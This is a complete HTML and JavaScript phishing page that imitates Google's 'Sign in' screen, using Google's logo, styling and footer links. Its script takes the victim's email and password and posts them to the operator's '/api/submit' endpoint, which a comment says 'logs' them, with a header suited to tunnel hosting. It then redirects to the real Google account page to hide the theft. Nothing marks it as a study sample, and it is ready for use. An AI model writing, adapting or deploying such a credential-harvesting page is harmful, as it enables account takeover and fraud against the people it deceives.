<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico"/>
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
    <title>Sign in – Google accounts</title>
    <style>
        /* Base Reset & Styling */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, code {
            font: 15px/22px arial, sans-serif;
        }
        html {
            background: #fff;
            color: #222;
            padding: 15px;
        }
        body {
            color: #222;
            text-align: unset;
            margin: 7% auto 0;
            max-width: 390px;
            min-height: 180px;
            padding: 30px 0 15px;
            font-family: 'Roboto', sans-serif;
        }
        .container {
            width: 100%;
        }
        .card {
            background: #fff;
            border-radius: 8px;
            padding: 0 0 40px;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }
        h3 {
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        .input-contain {
            position: relative;
            margin-bottom: 15px;
        }
        .input-contain input[type="text"],
        .input-contain input[type="password"] {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border 0.2s;
        }
        .input-contain input:focus {
            border: 2px solid #1a73e8;
        }
        .placeholder-text {
            position: absolute;
            left: 15px;
            top: 16px;
            background: #fff;
            padding: 0 4px;
            color: #5f6368;
            pointer-events: none;
            transition: 0.2s ease all;
        }
        /* Floating label effect when input has text or focus */
        .input-contain input:focus ~ .placeholder-text,
        .input-contain input:not(:placeholder-shown) ~ .placeholder-text {
            top: -10px;
            font-size: 12px;
            color: #1a73e8;
        }
        .card-bottom {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .card-bottom a, .btn-email a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        .card-bottom a:hover, .btn-email a:hover {
            text-decoration: underline;
        }
        button.disable-select {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }
        button.disable-select:hover {
            background-color: #1b66c9;
        }
        .btn-email button {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        p {
            margin: 11px 0 22px;
            font-size: 14px;
            color: #5f6368;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            font-size: 12px;
        }
        .footer select {
            border: none;
            background: none;
            color: #5f6368;
            cursor: pointer;
            outline: none;
        }
        .footer-span span {
            margin-left: 16px;
        }
        .footer-span a {
            color: #5f6368;
            text-decoration: none;
        }
        .footer-span a:hover {
            text-decoration: underline;
        }
        /* Profile Chip for Password Step */
        .YZrg6 {
            display: inline-flex;
            align-items: center;
            border: 1px solid #dadce0;
            border-radius: 100px;
            padding: 4px 12px 4px 4px;
            cursor: pointer;
            max-width: 100%;
        }
        .YZrg6:hover {
            background-color: #f8f9fa;
        }
        .gPHLDe {
            display: flex;
            align-items: center;
            margin-right: 8px;
        }
        .KTeGk {
            font-size: 12px;
            color: #3c4043;
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .krLnGe {
            margin-left: 4px;
        }
        #logo {
            display: inline-block;
            height: 54px;
            width: 150px;
            background: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png') no-repeat 0% 0% / 100% 100%;
            margin-left: -5px;
            margin-bottom: 16px;
        }
    </style>
</head>
<body id="document_html_">
    <div class="container">
        <div class="card">
            
            <!-- Google Logo Header -->
            <div class="Lth2jb" jsname="n7vHCb" aria-hidden="true">
                <div jsname="jjf7Ff">
                    <div id="logo" class="v8vQje" title="Google"></div>
                </div>
            </div>

            <!-- ========================================== -->
            <!-- STEP 1: EMAIL / PHONE INPUT VIEW          -->
            <!-- ========================================== -->
            <div id="step-email">
                <h2>Sign in</h2>
                <h3 id="text_2">Use your Google Account</h3>
                <div class="input-contain">
                    <form id="email-form" onsubmit="proceedToPassword(event)">
                        <input type="text"
                               id="email-input"
                               name="email"
                               placeholder=" " 
                               autocomplete="off"
                               required>
                        <label class="placeholder-text" for="email-input">
                            <div class="text">Email or phone</div>
                        </label>
                    </form>
                </div>
                <div style="text-align: left !important;">
                    <b id="error"></b>
                    <div class="btn-email">
                        <button type="button">
                            <a target="_blank" href="https://accounts.google.com/" class="link">Forgot Email?</a>
                        </button>
                    </div>
                    <p>
                        Not your computer? Use Guest mode to sign in privately.
                        <a target="_blank" href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a>
                    </p>
                    <div class="card-bottom">
                        <a target="_blank" href="https://google.com/">Create account</a>
                        <button type="button" onclick="proceedToPassword(event)" class="disable-select">Next</button>
                    </div>
                </div>
            </div>

            <!-- ========================================== -->
            <!-- STEP 2: PASSWORD INPUT VIEW (Hidden initially) -->
            <!-- ========================================== -->
            <div id="step-password" style="display: none;">
                <h2>Welcome</h2>
                <br>
                <div class="aCayab" style="margin: 0; padding: 0;">
                    <div class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link">
                        <div class="gPHLDe">
                            <div class="qQWzTd" aria-hidden="true">
                                <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="23px" height="23px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                </svg>
                            </div>
                        </div>
                        <div class="KTeGk">
                            <a style="font-size: 12px;" id="display-email"></a>
                        </div>
                        <div class="krLnGe">
                            <svg aria-hidden="true" class="stUf5b MSBt4d" fill="transparent" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                            </svg>
                        </div>
                    </div>
                </div>
                <br><br>
                <div class="input-contain">
                    <form id="password-form" onsubmit="submitForm(event)">
                        <input type="hidden" id="hidden-email" name="email">
                        <input type="password"
                               id="password-input"
                               name="password"
                               placeholder=" "
                               autocomplete="off"
                               required>
                        <label class="placeholder-text" for="password-input">
                            <div class="text" style="font-size: 12px;">Enter your password</div>
                        </label>
                    </form>
                </div>
                <div style="text-align: left !important;">
                    <b id="error"></b>
                    <br>
                    <input type="checkbox"
                           style="width: 15px; height: 15px; cursor: pointer;"
                           onclick="togglePasswordVisibility()">
                    <a style="margin-top: -30px; cursor: pointer;" onclick="togglePasswordVisibility()">&nbsp;Show password</a>
                    <div class="card-bottom">
                        <a target="_blank" href="https://accounts.google.com/">Forgot Password?</a>
                        <button type="button" onclick="submitForm(event)" class="disable-select">Next</button>
                    </div>
                    <div style="height: 110px;"></div>
                </div>
            </div>

            <!-- Footer Section -->
            <div class="footer">
                <select class="disable-select" name="select">
                    <option value="English (United States)">English (United States)</option>
                </select>
                <div class="footer-span">
                    <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=en">Help</a></span>
                    <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
                    <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
                </div>
            </div>

        </div>
    </div>

    <script>
        function proceedToPassword(e) {
            e.preventDefault();
            const emailValue = document.getElementById('email-input').value.trim();
            if (!emailValue) {
                alert('Please enter an email or phone number');
                return;
            }
            // Populate email in the password view chip and hidden input
            document.getElementById('display-email').textContent = emailValue;
            document.getElementById('hidden-email').value = emailValue;
            
            // Switch views
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('step-password').style.display = 'block';
            document.getElementById('password-input').focus();
        }

        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password-input');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        }

        function submitForm(e) {
            e.preventDefault();

            // 1. Grab the values from the inputs
            const emailVal = document.getElementById('hidden-email').value;
            const passwordVal = document.getElementById('password-input').value;

            // 2. Package them into an object
            const formData = {
                email: emailVal,
                password: passwordVal
            };

            // 3. Send them to your Node.js server
            fetch('/api/submit', {
    method: 'POST',
    headers: { 
        'Bypass-Tunnel-Reminder': 'true',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(formData)
})
            .then(response => response.json())
            .then(data => {
                console.log("Server response:", data.message);
                
                // 4. Run your alert and redirect AFTER the server successfully logs it
                window.location.replace("https://myaccount.google.com/?pli=1&nlr=1");
            })
            .catch(error => {
                console.error("Connection error:", error);
                
                // Fallback redirect if server isn't running
                window.location.replace("https://myaccount.google.com/?pli=1&nlr=1");
            });
        }
    </script>
    </script>
</body>
</html>
